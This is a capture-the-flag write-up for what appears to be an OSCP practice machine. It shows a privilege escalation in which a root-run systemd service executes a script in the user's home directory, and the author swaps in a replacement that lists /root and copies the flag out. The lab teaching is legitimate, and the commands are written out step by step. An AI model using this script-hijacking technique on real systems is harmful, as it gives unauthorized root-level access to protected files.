# Retrieving the Flag with the IP Script

## Gathering Info

Once logged in as the oscp user you can see that the ip script is in the oscp home directory. It is owned by root but we have the ability to read it.

To see how it is called we can run a grep search. The most likely spot to search is the `/etc/` directory:

``` bash
grep -r "/home/oscp/ip" /etc/
```

This returns:

``` text
/etc/systemd/system/ip-update.service:ExecStart=/home/oscp/ip
```

We can then check the `ip-update` service to see exactly how it is called.

``` bash
cat /etc/systemd/system/ip-update.service
```

Which returns:

``` text
[Unit]
Description=Write current ip addr to /etc/issue

[Service]
Type=oneshot
RemainAfterExit=true
ExecStart=/home/oscp/ip

[Install]
WantedBy=multi-user.target
```

Since no user information is present we know that the `ip` script is run as root. Since the script is in the oscp user directory we can rename the current script and create our own that will be run as root.

## Listing `/root/` Files

The WordPress post tells us the flag is in the `/root/` directory. So the first step is to list all the files in that directory. Rename the current ip script, create a new one and make it executable:

``` bash
cd /home/oscp/
mv ip ip.old
touch ip
chmod +x ip
```

Edit the new ip script with the following:

``` bash
#!/bin/sh
ls -la /root/ > /home/oscp/ls.txt
```

Now reboot the virtual machine. When it reboots our script will be run and we see the following:

``` text
-bash-5.0$ cat ls.txt
total 64
drwx------  6 root root 4096 Jul 11 17:21 .
drwxr-xr-x 20 root root 4096 Jul 25 16:10 ..
-rw-------  1 root root  258 Jul 11 17:35 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jul  9 08:19 .cache
-rwxr-xr-x  1 root root  248 Jul 11 17:15 fix-wordpress
-rw-r--r--  1 root root   33 Jul  9 06:39 flag.txt
drwxr-xr-x  3 root root 4096 Jul  9 18:27 .local
-rw-------  1 root root 1893 Jul 11 17:21 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   66 Jul 11 17:15 .selected_editor
drwxr-xr-x  3 root root 4096 Jul  9 03:38 snap
drwx------  2 root root 4096 Jul  9 03:38 .ssh
-rw-------  1 root root 9922 Jul 11 17:15 .viminfo
```

## Retrieving the Flag

Now we know the name of the file, we can edit the ip script once again to copy the contents to the oscp user directory:

``` bash
#!/bin/sh
cp /root/flag.txt /home/oscp/flag.txt
chown oscp:oscp /home/oscp/flag.txt
```

One more reboot and the flag will be located in the oscp home directory and owned by oscp.

``` text
-rw-r--r-- 1 oscp oscp   33 Jul 25 16:19 flag.txt
-rwxrwxr-x 1 oscp oscp   84 Jul 25 16:18 ip
-rwxr-xr-x 1 root root   88 Jul  9 08:15 ip.old
-rw-r--r-- 1 root root  721 Jul 25 16:13 ls.txt
```
